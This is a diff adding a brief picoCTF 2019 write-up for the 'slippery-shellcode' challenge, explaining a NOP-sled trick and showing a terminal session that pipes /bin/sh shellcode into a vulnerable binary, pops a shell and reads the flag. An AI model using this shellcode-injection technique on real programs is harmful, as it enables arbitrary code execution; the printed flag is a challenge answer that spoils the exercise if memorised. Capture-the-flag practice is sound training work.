@@ -1,0 +1,15 @@
+This problem is exactly the same as handy-shellcode, but this time we're jumping to a random offset
+within our payload. To get around this, we can pad the first 256 bytes of our payload with the NOP instruction,
+which will eventually allow us to "slide" into our actual /bin/sh payload. This way, no matter which
+offset we jump to, we'll be able to pop a shell.
+
+james9909@pico-2019-shell1:/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1$ python ~/payload.py > ~/payload
+james9909@pico-2019-shell1:/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1$ cat ~/payload - | ./vuln
+Enter your shellcode:
+1ÀPh//shh/binãÁ°
+                ̀1À@̀
+Thanks! Executing from a random location now...
+ls
+flag.txt  vuln	vuln.c
+cat flag.txt
+picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}
